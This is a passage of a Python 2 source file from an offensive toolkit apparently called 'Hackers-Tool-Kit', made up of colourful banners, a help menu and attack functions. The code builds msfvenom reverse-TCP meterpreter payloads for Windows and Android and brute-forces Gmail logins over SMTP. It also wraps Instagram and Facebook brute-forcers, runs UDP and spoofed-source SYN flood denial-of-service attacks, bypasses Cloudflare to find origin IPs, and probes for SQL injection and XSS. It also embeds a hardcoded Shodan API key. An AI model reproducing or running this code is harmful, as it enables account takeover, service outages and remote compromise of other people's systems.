  @@OvB           B:u@MMO\033[31mMOMMBJiB          .BvM@B
  @B@B@J         0@B@MMOMOMOMB@B@u         q@@@B@
  B@MBB@v       G@@BMMMMMMMMMMMBB@5       F@BMM@B
  @BBM@BPNi   LMEB@OMMMM@B@MMOMM@BZM7   rEqB@MBB@
  B@@@BM  B@B@B  qBMOMB@B@B@BMOMBL  B@B@B  @B@B@M
   J@@@@PB@B@B@B7G@OMBB.   ,@MMM@qLB@B@@@BqB@BBv
      iGB@,i0@M@B@MMO@E  :  M@OMM@@@B@Pii@@N:
         .   B@M@B@MMM@B@B@B@MMM@@@M@B
             @B@B.i@MBB@B@B@@BM@::B@B@
             B@@@ .B@B.:@B@ :B@B  @B@O
               :0 r@B@  B@@ .@B@: P:
                   vMB :@B@ :BO7
                       ,B@B\033[0m

            \033[32m╔═══\033[93m+\033[0mHackers-Tool-Kit\033[93m+\033[32m════╗\033[0m
            ███████████████████████████
                 type   █?█ for help
                        ███
            \033[31m▄▄    ▄▄    \033[0m███\033[31m    ▄▄   ▄▄▄ 
            ██    ██    \033[0m███\033[31m    ██  ██▀  
            ██    ██    \033[0m███\033[31m    ██▄██    
            ████████    \033[0m███\033[31m    █████    
            ██    ██    \033[0m███\033[31m    ██  ██▄  
            ██    ██    \033[0m███\033[31m    ██   ██▄ 
            ▀▀    ▀▀    \033[0m▀▀▀\033[31m    ▀▀    ▀▀\033[0m 
	""".decode('utf-8')
def mainbanner17():
	print """

                 .---.
                 |---|
           type  |-\033[32m?\033[0m-| for help
                 |---|
             .---^ - ^---.
             :___________:
   \033[31m▄█    █▄\033[0m     |  |//|     \033[32m▄█   ▄█▄\033[0m 
  ███    ███    |  |//|    ███ ▄███▀ 
  ███    ███    |  |//|    ███▐██▀   
  ███▄▄▄▄███    |  |//|    █████▀    
  ███▀▀▀▀███    |  |//|    █████▄    
  ███    ███    |  |//|    ███▐██▄   
  ███    ███    |  |.-|    ███ ▀███▄ 
  \033[31m███    ███\033[0m    |.-'**|    \033[32m███   ▀█▀\033[0m 
                 \***/               
                  \*\033[91m/\033[31m
                   V\033[0m
	""".decode('utf-8')
def mainbanner18():
	print """
                             Type \033[31m?\033[0m For\033[31m Help\033[0m
\033[31m╔═══╗           ╔═══╗    ╔═════════════════════╗    ╔═══╗     ╔═══╗
║\033[0mHTK\033[31m║           ║\033[0mHTK\033[31m║    ║\033[0mHTKHTKHTKHTKHTKHTKHTK\033[31m║    ║\033[0mHTK\033[31m║    ╔╝\033[0mHTK\033[31m║
║\033[0mHTK\033[31m║           ║\033[0mHTK\033[31m║    ║\033[0mHTKHTKHTKHTKHTKHTKHTK\033[31m║    ║\033[0mHTK\033[31m║  ╔═╝\033[0mHTK\033[31m╔╝
║\033[0mHTK\033[31m║           ║\033[0mHTK\033[31m║    ╚════════╗\033[0mHTK\033[31m╔════════╝    ║\033[0mHTK\033[31m║ ╔╝\033[0mHTK\033[31m╔═╝
║\033[0mHTK\033[31m║           ║\033[0mHTK\033[31m║             ║\033[0mHTK\033[31m║             ║\033[0mHTK\033[31m║╔╝\033[0mHTK\033[31m╔╝
║\033[0mHTK\033[31m╚═══════════╝\033[0mHTK\033[31m║             ║\033[0mHTK\033[31m║             ║\033[0mHTK\033[31m╚╝\033[0mHTK\033[31m╔╝
║\033[0mHTKHHHHHHHHHHHHHHTK\033[31m║             ║\033[0mHTK\033[31m║             ║\033[0mHTK HTK\033[31m╔╝
║\033[0mHTKTTTTTTTTTTTTTHTK\033[31m║             ║\033[0mHTK\033[31m║             ║\033[0mHTKHTK \033[31m╚╗\033[0m
║\033[31mHTKKKKKKKKKKKKKKHTK\033[0m║             ║\033[31mHTK\033[0m║             ║\033[31mHTK\033[0m╔╗\033[31mHTK\033[0m╚═╗
║\033[31mHTK\033[0m╔═══════════╗\033[31mHTK\033[0m║             ║\033[31mHTK\033[0m║             ║\033[31mHTK\033[0m║╚═╗\033[31mHTK\033[0m╚╗
║\033[31mHTK\033[0m║           ║\033[31mHTK\033[0m║             ║\033[31mHTK\033[0m║             ║\033[31mHTK\033[0m║  ╚╗\033[31mHTK\033[0m╚╗
║\033[31mHTK\033[0m║           ║\033[31mHTK\033[0m║             ║\033[31mHTK\033[0m║             ║\033[31mHTK\033[0m║   ╚╗\033[31mHTK\033[0m╚╗
║\033[31mHTK\033[0m║           ║\033[31mHTK\033[0m║             ║\033[31mHTK\033[0m║             ║\033[31mHTK\033[0m║    ╚╗\033[31mHTK\033[0m╚╗
║\033[31mHTK\033[0m║           ║\033[31mHTK\033[0m║             ║\033[31mHTK\033[0m║             ║\033[31mHTK\033[0m║     ╚╗\033[31mHTK\033[0m║
╚═══╝           ╚═══╝             ╚═══╝             ╚═══╝      ╚═══╝
	""".decode('utf-8')
def mainbanner19():
	print """\033[31m
        #                               #        
        #                               #        
       %#         \033[0m@tuf_unkn0wn\033[31m          ##       
      ,%/                               /%,      
      %##                               ##%      
      &%##                             ##%&      
      ,%%#####/.                 ,/#####%%,      
       %&%%#####/     \033[0m████\033[31m      /#####%%&%       
        .&&%%%&&      \033[0m████\033[31m       &&%%%&&.        
           /&%(       \033[0m████\033[31m        (%&(                                           
                      \033[0m████
                      ████
                      ████
                      ████
                      ████
                      ████
                      ████
                      ████
                      ████
                      ████        
                      ████
                      ████
                      ████   
                      ████
                      ████
 \033[31m██████\033[31m       type    \033[0m█\033[31m??\033[0m█   \033[31mfor help     ██████
██       \033[0m██████████████████████████████\033[31m  ██
███████  \033[0m██████████████████████████████\033[31m  ███████
██    ██              \033[0m████             \033[31m  ██    ██
 ██████               \033[0m████             \033[31m   ██████
 ▒ ▓▒ ▒                                   ▒ ▓▒ ▒
 ░ ▒  ░              ██████               ░ ▒  ░
   ░  ░             ██                      ░  ░
                    ███████
                    ██    ██
                     ██████
                     ▒ ▓▒ ▒ 
                     ░ ▒  ░ 
                       ░  ░\033[0m  
	""".decode('utf-8')
def mainbanner20():
	print """


  ██╗\033[31m██╗  ██╗\033[0m██╗    ██╗\033[92m████████╗\033[0m██╗    ██╗\033[34m██╗  ██╗\033[0m██╗  
 ██╔╝\033[31m██║  \033[31m██║\033[0m╚██╗  ██╔╝\033[92m╚══\033[92m██╔══╝\033[0m╚██╗  ██╔╝\033[34m██║ ██╔╝\033[0m╚██╗ 
██╔╝ \033[31m███████║ \033[0m╚██╗██╔╝\033[92m    ██║    \033[0m╚██╗██╔╝\033[34m █████╔╝  \033[0m╚██╗
╚██╗ \033[31m██╔══██║ \033[0m██╔╝╚██╗    \033[92m██║ \033[0m   ██╔╝╚██╗\033[34m ██╔═██╗\033[0m  ██╔╝
 ╚██╗\033[31m██║  ██║\033[0m██╔╝  ╚██╗\033[92m   ██║ \033[0m  ██╔╝  ╚██╗\033[34m██║  ██╗\033[0m██╔╝ 
  ╚═╝\033[31m╚═╝  ╚═╝\033[0m╚═╝    ╚═╝\033[92m   ╚═╝  \033[0m ╚═╝    ╚═╝\033[34m╚═╝  ╚═╝\033[0m╚═╝  
  Created by @tuf_unkn0wn             type ? for help                                                 

	""".decode('utf-8')
def mainbanner21():
	os.system("cat /root/hackers-tool-kit/tools/venombanner.txt")


def mainbanner():
	import random
	for x in range(10):
	  num = random.randint(1,21)
	if num == 1:
		mainbanner1()
	if num == 2:
		mainbanner2()
	if num == 3:
		mainbanner3()
	if num == 4:
		mainbanner4()
	if num == 5:
		mainbanner5()
	if num == 6:
		mainbanner6()
	if num == 7:
		mainbanner7()
	if num == 8:
		mainbanner8()
	if num == 9:
		mainbanner9()
	if num == 10:
		mainbanner10()
	if num == 11:
		mainbanner11()
	if num == 12:
		mainbanner12()
	if num == 13:
		mainbanner13()
	if num == 14:
		mainbanner14()
	if num == 15:
		mainbanner15()
	if num == 16:
		mainbanner16()
	if num == 17:
		mainbanner17()
	if num == 18:
		mainbanner18()
	if num == 19:
		mainbanner19()
	if num == 20:
		mainbanner20()
	if num == 21:
		mainbanner21()
#--------------------------#
#MAIN STARTING BANNER END#


#HELP BANNER START#
#-----------------#
def help():
			print B+"""
▒▒   ▓▒█░▒ ▒▓▒ ▒ ░ ▒▒▓  ▒  ▒ ░    ░▒   ▒  ▒ ░░▒░▒▒▓▒▒░   ▒▓▒▒░  ▒ ░   ░ ▒░   ▒ ▒ 
 ▒   ▒▒ ░░ ░▒  ░ ░ ░ ▒  ▒  ░       ░   ░  ▒ ░▒░ ░▒ ░▒░   ▒ ░▒░  ░     ░ ░░   ░ ▒░
 ░   ▒   ░  ░  ░   ░ ░  ░  ░ ░   ░ ░   ░  ░  ░░ ░░ ░ ░   ░ ░ ░  ░ ░      ░   ░ ░ 
     ░  ░      ░     ░                 ░  ░  ░  ░░   ░   ░   ░                 ░ 
\033[0m		            ░                                                             
?       :	displays this message
reboot  :	reboot hackers-tool-kit
update  :	update the hackers-tool-kit
clear   :	clears screen
banner  :	clears screen and shows new banner
exit    :	exits script
restart :	re run hackers-tool-kit
rebootl :	reboot whole device
winload :	windows reverse_tcp payload
andload :	android reverse_tcp payload
connect :	connect to a host
command :	execute terminal command
msfcon  :	metasploit console
set     :	setoolkit console
msfven  :	msfvenom
gmail   :	gmail bruteforce
insta   :	instagram bruteforce
fb      :	facebook bruteforce
hydra   :	Black-Hydra bruteforce
medusa  :	Medusa bruteforce
ipgrab  :	host to ip address
myip    :	show your ip
wifite  :	automated wifi hacker 
reaver  :	reaver automated [ wifi hack ]
aircrack:	aircrack-ng automated [ wifi hack ]
mon     :	put device in monitor mode
monoff  :	put device out of monitor mode
netdev  :	find all devices in your network                       
scannet :	scan for networks around you                          
specnet :	scan a specific network                               
port    :	scan for ports on a host                            
info    :	info gather on a host [includes port scan]\033[91m            █████████████████████ \033[0m
sysinfo :	info about your system  \033[91m                             ██                   ██\033[0m
msfex   :	shows all metasploit exploits  \033[91m                     ██                     ██\033[0m
msfpa   :	shows all metasploit payloads   \033[91m                   ██\033[90m      ██       ██\033[91m      ██\033[0m
msfau   :	shows all metasploit auxiliarys    \033[91m                ██\033[90m      ██       ██\033[91m      ██\033[0m
msfall  :	shows all metasploit modules      \033[91m                 ██                       ██\033[0m
udp     :	UDP flood / dos                   \033[91m                  ██ \033[90m         █   \033[91m       ██\033[0m
tcp     :	TCP flood / dos                   \033[91m                   ██\033[90m         █   \033[91m      ██\033[0m
syn     :	SYN flood / dos                   \033[91m                     █                 █\033[0m
slowl   :	Slow Loris dos                     \033[91m                     █               █ \033[0m
ping    :	pings host                          \033[91m                    █               █\033[0m
multih  :	start a multi handler               \033[91m                    █               █\033[0m
cupp    :	make wordlists                                           \/ vvvvvvvvv \/
vdir    :	view files of a directory                           
vpn     :	activate a vpn                              
vpnoff  :	stop vpn
pidox   :	dox website
pingen  :	Generate a routers default pin
deauth  :	deauth attack / wifi jammer
macc    :	changes mac address
macoff  :	returns mac address to normal                           Hackers-Tool-Kit
arpspoof:	arp spoofing                                                    |
sslscan :	ssl scan a host                                  ██╗  ██╗   ████████╗   ██╗  ██╗
payload :	make a metasploit payload of your choice         ██║  ██║   ╚══██╔══╝   ██║ ██╔╝
crunch  :	Make wordlists                                   ███████║\033[91m█████\033[0m╗██║\033[91m█████\033[0m╗█████╔╝
traff   :	shows your internet traffic                      ██╔══██║╚════╝██║╚════╝██╔═██╗ 
resa    :	reset account password                           ██║  ██║      ██║      ██║  ██╗
resu    :	reset unix password                              ╚═╝  ╚═╝      ╚═╝      ╚═╝  ╚═╝
hashid  :	find the type of hash of a hash                                 |
wafwoof :	check a web application for firewall                    Hackers-Tool-Kit
cloud   :	cloudflare bypass
brutex  :	auto bruteforce every service of a host
methelp :	show meterpreter help
winbyp  :	windows defender bypass
exploit :	use a metasploit exploit of your choice
phish   :	phishing automated
datalist:	list all hosts & services in the database
msfev   :	shows all metasploit evasions
upgrade :	fully update your linux os
nscript :	use a nmap script
sshver  :	scan for ssh version on a host
chains  :	browse web anonymous via proxychains [proxychains setup required]
mysqlv  :	scan for mysql version on a host
terminal:	open another new terminal
source  :	get source code from a website
dirscan :	web directory scanner / bruteforce
aserver :	start a apache server
run	:	run a file 
phpload :	make a php reverse_tcp payload and start it in a multi handler
pyload  :	make a python reverse_tcp payload and start it in a multi handler
foxhis  :	gather firefox history from privileged javascript shell
rhawk   :	run the RED_HAWK script (info gathering tool)
nano    :	open nano text editor
compilec:	compile a c file
dnsspoof:	dns spoofing  [type dnsspoofall to spoof entire subnet]
htk-lite:	run a lighter version of hackers-tool-kit
\033[91m---------------------------------------------------------------------------------\033[0m
	"""
#-----------------#
#HELP BANNER END#


#WINDOWS REVERSE TCP PAYLOAD START#
#---------------------------------#
def winload():
	gw = os.popen("ip -4 route show default").read().split()
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect((gw[2], 0))
	ipaddr = s.getsockname()[0]
	gateway = gw[2]
	host = socket.gethostname()
	pf = raw_input("Port: ")
	na = raw_input("Name of File: ")
	ak = 'msfvenom -p windows/meterpreter/reverse_tcp LPORT={0} -f exe -o /root/{1}.exe LHOST={2}'.format(pf,na,ipaddr)
	os.system(ak)
#-------------------------------#
#WINDOWS REVERSE TCP PAYLOAD END#


#ANDROID REVERSE TCP PAYLOAD START#
#---------------------------------#
def andload():
	gw = os.popen("ip -4 route show default").read().split()
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect((gw[2], 0))
	ipaddr = s.getsockname()[0]
	gateway = gw[2]
	host = socket.gethostname()
	pf = raw_input("Port: ")
	na = raw_input("Name of File: ")
	ak = 'msfvenom -p android/meterpreter/reverse_tcp LPORT={0} -o /root/{1}.apk LHOST={2}'.format(pf,na,ipaddr)
	os.system(ak)
#-------------------------------#
#ANDROID REVERSE TCP PAYLOAD END#

#GMAIL BRUTEFORCE START#
#----------------------#
def gmail():
  #!/usr/bin/python
  '''create by Ha3MrX'''

  import smtplib
  from os import system

  def main():
     print '\033[93m================================================='
     print '\033[91m               create by Ha3MrX                  '
     print '\033[93m================================================='
     print '\033[95m               ++++++++++++++++++++              '
     print '\n                                               '
     print '\033[92m  _,.                                            '
     print '                                                 '
     print '                                                 '
     print '           HA3MrX                                '
     print '       _,.                   '
     print '     ,` -.)                  '
     print '    ( _/-\\-._               '
     print '   /,|`--._,-^|            , '
     print '   \_| |`-._/||          , | '
     print '     |  `-, / |         /  / '
     print '     |     || |        /  /  '
     print '      `r-._||/   __   /  /   '
     print '  __,-<_     )`-/  `./  /    '
     print '  \   `---    \   / /  /     '
     print '     |           |./  /      '
     print '     /           //  /       '
     print ' \_/  \         |/  /        '
     print '  |    |   _,^- /  /         '
     print '  |    , ``  (\/  /_         '
     print '   \,.->._    \X-=/^         '
     print '   (  /   `-._//^`           '
     print '    `Y-.____(__}             '
     print '     |     {__)              ' 
     print '           () \033[91m  V.1.0        '

  main()
  print '\033[0m[1] start the attack'
  print '[2] exit'
  option = input('==>')
  if option == 1:
     file_path = raw_input('path of passwords file :')
  else:
     system('clear')
     exit()
  pass_file = open(file_path,'r')
  pass_list = pass_file.readlines()
  def login():
      i = 0
      user_name = raw_input('target email :')
      server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
      server.ehlo()
      for password in pass_list:
        i = i + 1
        print str(i) + '/' + str(len(pass_list))
        try:
           server.login(user_name, password)
           system('clear')
           main()
           print '\n'
           print '[+] This Account Has Been Hacked Password :' + password + '     ^_^'
           break
        except smtplib.SMTPAuthenticationError as e:
           error = str(e)
           if error[14] == '<':
              system('clear')
              main()
              print '[+] this account has been hacked, password :' + password + '     ^_^'

              break
           else:
              print '[!] password not found => ' + password
  login()
#--------------------#
#GMAIL BRUTEFORCE END#

#PORT SCAN START#
#---------------#
def port():
	n = raw_input("Enter Target: ")
	os.system("nmap " + n)
#-------------#
#PORT SCAN END#

#INSTAGRAM BRUTEFORCE START#
#--------------------------#
def insta():
	insta = raw_input("USERNAME> ")
	jl = raw_input("WORDLIST> ")
	print "\033[1m\033[33m\nMODES>: [0] fastest, [1] fast, [2] slow, [3] slowest\033[0m\n"
	k = raw_input("MODE> ")
	ma = 'python3 /root/hackers-tool-kit/tools/Instagram/instagram.py {0} {1} -m {2}'.format(insta,jl,k)
	os.system(ma)
#------------------------#
#INSTAGRAM BRUTEFORCE END#

#FACEBOOK BRUTEFORCE START#
#-------------------------#
def fb():
	facebook = raw_input("[EMAIL/ID->]: ")
	word = raw_input("[WORDLIST->]: ")
	ks = 'cd /root/hackers-tool-kit/tools && perl fb-brute.pl {0} {1}'.format(facebook,word)
	os.system(ks)
#-----------------------#
#FACEBOOK BRUTEFORCE END#

#HOST TO IP START#
#----------------#
def ipgrab():
	b = raw_input(Y+'Enter Host:\033[0m ')
	ip = socket.gethostbyname(b)
	print G+"------------------------\033[0m"
	print N+"Host: ", b
	print N+"IP: ", ip
	print G+"------------------------\033[0m"
#--------------#
#HOST TO IP END#

#YOUR OWN IP START#
#-----------------#
def myip():
	gw = os.popen("ip -4 route show default").read().split()
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect((gw[2], 0))
	ipaddr = s.getsockname()[0]
	gateway = gw[2]
	host = socket.gethostname()
	print ("IP: ", ipaddr, " Gateway:", gateway, " Host:", host)
	print "\n        Router IP"
	print "----------------------------\033[92m"
	os.system('curl "http://myexternalip.com/raw"')
	print "\n\033[0m----------------------------"
#---------------#
#YOUR OWN IP END#


#AUTOMATED WIFI HACK START#
#-------------------------#
def wifite():
	os.system("wifite")
#-----------------------#
#AUTOMATED WIFI HACK END#


#MONITOR MODE START#
#------------------#
def mon():
	os.system("iwconfig")
	i = raw_input("Select Interface: ")
	os.system("airmon-ng start " + i)
#----------------#
#MONITOR MODE END#


#DEVICES IN THE NET START#
#------------------------#
def netdev():
	os.system("netdiscover")
#----------------------#
#DEVICES IN THE NET END#


#NETS AROUND YOU START#
#-----------------------#
def scannet():
	os.system("iwconfig")
	m = raw_input("Select Interface: ")
	print Y+"WOULD YOU LIKE TO SAVE YOUR SCAN RESULTS?\033[0m"
	j = raw_input("[y/n]> ")
	if j == "y":
		os.system("airodump-ng -w /root/SCAN " + m)
		print Y+"! SCAN RESULTS SAVED IN /root/ DIRECTORY !\033[0m"
	if j == "n":
		os.system("airodump-ng " + m)
#---------------------#
#NETS AROUND YOU END#


#INFO SCAN HOST START#
#--------------------#
def info():
  params = []
  # Browser
  br = mechanize.Browser()

  # Just some colors and shit
  white = '\033[1;97m'
  green = '\033[1;32m'
  red = '\033[1;31m'
  yellow = '\033[1;33m'
  end = '\033[1;m'
  info = '\033[1;33m[!]\033[1;m'
  que =  '\033[1;34m[?]\033[1;m'
  bad = '\033[1;31m[-]\033[1;m'
  good = '\033[1;32m[+]\033[1;m'
  run = '\033[1;97m[~]\033[1;m'

  # Cookie Jar
  cj = cookielib.LWPCookieJar()
  br.set_cookiejar(cj)

  # Browser options
  br.set_handle_equiv(True)
  br.set_handle_redirect(True)
  br.set_handle_referer(True)
  br.set_handle_robots(False)

  # Follows refresh 0 but not hangs on refresh > 0
  br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
  br.addheaders = [
      ('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]


  print '''\033[1;31m
     _________ __          __ __
    /   _____//  |________|__|  | __ ___________
    \_____  \\\\   __\_  __ \  |  |/ // __ \_  __ \\
    /        \|  |  |  | \/  |    <\  ___/|  | \/
   /_______  /|__|  |__|  |__|__|_ \\\\___  >__|
           \/                     \/    \/\033[1;m'''
  target = raw_input('\033[1;34m[?]\033[1;m Enter the target: ')
  if 'http' in target:
      parsed_uri = urlparse(target)
      domain = '{uri.netloc}'.format(uri=parsed_uri)
  else:
      domain = target
      try:
          br.open('http://' + target)
          target = 'http://' + target
      except:
          target = 'https://' + target

  def sqli(url):
      print '%s Using SQLMap api to check for SQL injection vulnerabilities. Don\'t worry we are using an online service and it doesn\'t depend on your internet connection. This scan will take 2-3 minutes.' % run
      br.open('https://suip.biz/?act=sqlmap')
      br.select_form(nr=0)
      br.form['url'] = url
      req = br.submit()
      result = req.read()
      match = search(r"---(?s).*---", result)
      if match:
          print '%s One or more parameters are vulnerable to SQL injection' % good
          option = raw_input(
              '%s Would you like to see the whole report? [Y/n] ' % que).lower()
          if option == 'n':
              pass
          else:
              print '\033[1;31m-\033[1;m' * 40
              print match.group().split('---')[1][:-3]
              print '\033[1;31m-\033[1;m' * 40
      else:
          print '%s None of parameters is vulnerable to SQL injection' % bad


  def cms(domain):
      try:
          result = br.open('https://whatcms.org/?s=' + domain).read()
          detect = search(r'class="nowrap" title="[^<]*">', result)
          WordPress = False
          try:
              r = br.open(target + '/robots.txt').read()
              if "wp-admin" in str(r):
                  WordPress = True
          except:
              pass
          if detect:
              print '%s CMS Detected : %s' % (info, detect.group().split('class="nowrap" title="')[1][:-2])
              detect = detect.group().split('">')[1][:-27]
              if 'WordPress' in detect:
                  option = raw_input(
                      '%s Would you like to use WPScan? [Y/n] ' % que).lower()
                  if option == 'n':
                      pass
                  else:
                      os.system('wpscan --random-agent --url %s' % domain)
          elif WordPress:
              print '%s CMS Detected : WordPress' % info
              option = raw_input(
                  '%s Would you like to use WPScan? [Y/n] ' % que).lower()
              if option == 'n':
                  pass
              else:
                  os.system('wpscan --random-agent --url %s' % domain)
          else:
              print '%s %s doesn\'t seem to use a CMS' % (info, domain)
      except:
          pass

  def honeypot(ip_addr):
      result = {"0.0": 0, "0.1": 10, "0.2": 20, "0.3": 30, "0.4": 40, "0.5": 50, "0.6": 60, "0.7": 70, "0.8": 80, "0.9": 90, "1.0": 10}
      honey = 'https://api.shodan.io/labs/honeyscore/%s?key=C23OXE0bVMrul2YeqcL7zxb6jZ4pj2by' % ip_addr
      try:
          phoney = br.open(honey).read()
          if float(phoney) >= 0.0 and float(phoney) <= 0.4:
              what = good
          else:
              what = bad
          print '{} Honeypot Probabilty: {}%'.format(what, result[phoney])
      except KeyError:
          print '\033[1;31m[-]\033[1;m Honeypot prediction failed'

  def whoisIt(url):
      who = ""
      print '{} Trying to gather whois information for {}'.format(run,url)
      try:
          who = str(whois.whois(url)).decode()
      except Exception:
          pass
      test = who.lower()
      if "whoisguard" in test or "protection" in test or "protected" in test:
          print '{} Whois Protection Enabled{}'.format(bad, end)
      else:
          print '{} Whois information found{}'.format(good, end)
          try:
              data = json.loads(who)
              for key in data.keys():
                  print "{} :".format(key.replace("_", " ").title()),
                  if type(data[key]) == list:
                      print ", ".join(data[key])
                  else:
                      print "{}".format(data[key])
          except ValueError:
              print '{} Unable to build response, visit https://who.is/whois/{} {}'.format(bad, url, end) 
      pass

  def nmap(ip_addr):
      port = 'http://api.hackertarget.com/nmap/?q=' + ip_addr
      result = br.open(port).read()
      result = sub(r'Starting[^<]*\)\.', '', result)
      result = sub(r'Service[^<]*seconds', '', result)
      result = os.linesep.join([s for s in result.splitlines() if s])
      print result

  def bypass(domain):
      post = urlencode({'cfS': domain})
      result = br.open(
          'http://www.crimeflare.info/cgi-bin/cfsearch.cgi ', post).read()

      match = search(r' \b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b', result)
      if match:
          bypass.ip_addr = match.group().split(' ')[1][:-1]
          print '%s Real IP Address : %s' % (good, bypass.ip_addr)

  def dnsdump(domain):
      res = DNSDumpsterAPI(False).search(domain)
      print '\n%s DNS Records' % good
      for entry in res['dns_records']['dns']:
          print '{domain} ({ip}) {as} {provider} {country}'.format(**entry)
      for entry in res['dns_records']['mx']:
          print '\n%s MX Records' % good
          print '{domain} ({ip}) {as} {provider} {country}'.format(**entry)
      print '\n\033[1;32m[+]\033[1;m Host Records (A)'
      for entry in res['dns_records']['host']:
          if entry['reverse_dns']:
              print '{domain} ({reverse_dns}) ({ip}) {as} {provider} {country}'.format(**entry)
          else:
              print '{domain} ({ip}) {as} {provider} {country}'.format(**entry)
      print '\n%s TXT Records' % good
      for entry in res['dns_records']['txt']:
          print entry
      print '\n%s DNS Map: https://dnsdumpster.com/static/map/%s.png\n' % (good, domain.strip('www.'))


  def fingerprint(ip_addr):
      try:
          result = br.open('https://www.censys.io/ipv4/%s/raw' % ip_addr).read()
          match = search(r'&#34;os_description&#34;: &#34;[^<]*&#34;', result)
          if match:
              print '%s Operating System : %s' % (good, match.group().split('n&#34;: &#34;')[1][:-5])
      except:
          pass


  ip_addr = socket.gethostbyname(domain)
  print '%s IP Address : %s' % (info, ip_addr)
  try:
      r = requests.get(target)
      header = r.headers['Server']
      if 'cloudflare' in header:
          print '%s Cloudflare detected' % bad
          bypass(domain)
          try:
              ip_addr = bypass.ip_addr
          except:
              pass
      else:
          print '%s Server: %s' % (info, header)
      try:
          print '%s Powered By: %s' % (info, r.headers['X-Powered-By'])
      except:
          pass
      try:
          r.headers['X-Frame-Options']
      except:
          print '%s Clickjacking protection is not in place.' % good
  except:
      pass
  fingerprint(ip_addr)
  cms(domain)
  try:
      honeypot(ip_addr)
  except:
      pass
  print "{}----------------------------------------{}".format(red, end)
  whoisIt(domain)
  try:
      r = br.open(target + '/robots.txt').read()
      print '\033[1;31m-\033[1;m' * 40
      print '%s Robots.txt retrieved\n' % good, r
  except:
      pass
  print '\033[1;31m-\033[1;m' * 40
  nmap(ip_addr)
  print '\033[1;31m-\033[1;m' * 40
  dnsdump(domain)
  os.system('cd plugins && python theHarvester.py -d %s -b all' % domain)
  try:
      br.open(target)
      print '%s Crawling the target for fuzzable URLs' % run
      for link in br.links():
          if 'http' in link.url or '=' not in link.url:
              pass
          else:
              url = target + '/' + link.url
              params.append(url)
      if len(params) == 0:
          print '%s No fuzzable URLs found' % bad
          quit()
      print '%s Found %i fuzzable URLs' % (good, len(params))
      for url in params:
          print url
          sqli(url)
          url = url.replace('=', '<svg/onload=alert()>')
          r = br.open(url).read()
          if '<svg/onload=alert()>' in r:
              print '%s One or more parameters are vulnerable to XSS' % good
          break
      print '%s These are the URLs having parameters:' % good
      for url in params:
          print url
  except:
      pass
#------------------#
#INFO SCAN HOST END#


#INFO ON YOUR SYSTEM START#
#-------------------------#
def sysinfo():
	os.system("iwconfig")
	k = raw_input("Interface: ")
	os.system("clear")
	os.system("ifconfig")
	print "\n"
	os.system("iwconfig")
	print "\n"
	os.system("neofetch")
	print "\n"
	gw = os.popen("ip -4 route show default").read().split()
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	s.connect((gw[2], 0))
	ipaddr = s.getsockname()[0]
	gateway = gw[2]
	host = socket.gethostname()
	print (" IP: ", ipaddr, " Gateway: ", gateway, " Host: ", host)
	print "\n        Router IP"
	print "----------------------------\033[92m"
	os.system('curl "http://myexternalip.com/raw"')
	print "\n\033[0m----------------------------"
	print "\n"
	show = 'macchanger -s {0}'.format(k)
	os.system(show)
#-----------------------#
#INFO ON YOUR SYSTEM END#


#ALL METASPLOIT EXPLOITS START#
#-----------------------------#
def msfex():
	os.system("service postgresql start")
	os.system("""msfconsole -x 'show exploits'""")
#---------------------------#
#ALL METASPLOIT EXPLOITS END#


#UDP DOS START#
#-------------#
def udp():
	target = raw_input(N+"Target:\033[91m ")
	ip = socket.gethostbyname(target)
	port = input(N+"Port:\033[91m ")
	os.system("service tor restart")
	print N+"udp attack started on {0}.{1} | {2}-{3}-{4}".format(hour, minute, day, month, year)
	os.system("sleep 2s")
	sent = 0
	print "KILLING %s CONNECTIONS"%(ip)						
	while True:
		sock.sendto(Gb, (ip,port))
		sock.sendto(bytes, (ip,port))
		sock.sendto(Kb, (ip,port))
		sent = sent + 1
		port = port + 1
		print B+"|+| Slapping \033[0m|\033[31m %s \033[0m| Port |\033[31m %s \033[0m| Bytes |\033[31m %s \033[0m|"%(ip,port,sent)
		if port == 65534:
			port = 1
#-----------#
#UDP DOS END#

#TCP FLOOD START#
#---------------#
def tcp():
	print Y+"-p = port | -t = threads | Example:     tcp 95.52.541.1 -p 80 -t 600\033[0m"
	print "\n"
	tcp = raw_input(Y+"[\033[92m+\033[91m-\033[0mTCP\033[91m-\033[92m+\033[93m]\033[0m ")
	print R+"IF YOU GET SPAMMED WITH ERRORS BUT ITS STILL RUNNING ITS FINE\033[0m"
	os.system("sleep 5")
	os.system("python /root/hackers-tool-kit/tools/" + tcp)
#-------------#
#TCP FLOOD END#


#SYN FLOOD START#
#---------------#
def syn():
  def randomIP():
    ip = ".".join(map(str, (random.randint(0,255)for _ in range(4))))
    return ip

  def randInt():
    x = random.randint(1000,9000)
    return x  

  def SYN_Flood(dstIP,dstPort,counter):
    total = 0
    print "Packets are sending ..."
    for x in range (0,counter):
      s_port = randInt()
      s_eq = randInt()
      w_indow = randInt()

      IP_Packet = IP ()
      IP_Packet.src = randomIP()
      IP_Packet.dst = dstIP

      TCP_Packet = TCP () 
      TCP_Packet.sport = s_port
      TCP_Packet.dport = dstPort
      TCP_Packet.flags = "S"
      TCP_Packet.seq = s_eq
      TCP_Packet.window = w_indow

      send(IP_Packet/TCP_Packet, verbose=0)
      total+=1
    sys.stdout.write("\nTotal packets sent: %i\n" % total)


  def info():

    dstIP = raw_input ("\nTarget IP : ")
    dstPort = input ("Target Port : ")
    
    return dstIP,int(dstPort)
    

  def main():
    dstIP,dstPort = info()
    counter = input ("Packets : ")
    SYN_Flood(dstIP,dstPort,int(counter))

  main()
#-------------#
#SYN FLOOD END#


#PING A HOST START#
#-----------------#
def ping():
	p = raw_input("Enter Host: ")
	os.system("ping " + p)
#---------------#
#PING A HOST END#


#ALL METASPLOIT PAYLOADS START#
#-----------------------------#
def msfpa():
	os.system("service postgresql start")
	os.system("""msfconsole -x 'show payloads'""")
#---------------------------#
#ALL METASPLOIT PAYLOADS END#


#ALL METASPLOIT AUX START#
#------------------------#
def msfau():
	os.system("service postgresql start")
	os.system("""msfconsole -x 'show auxiliary'""")
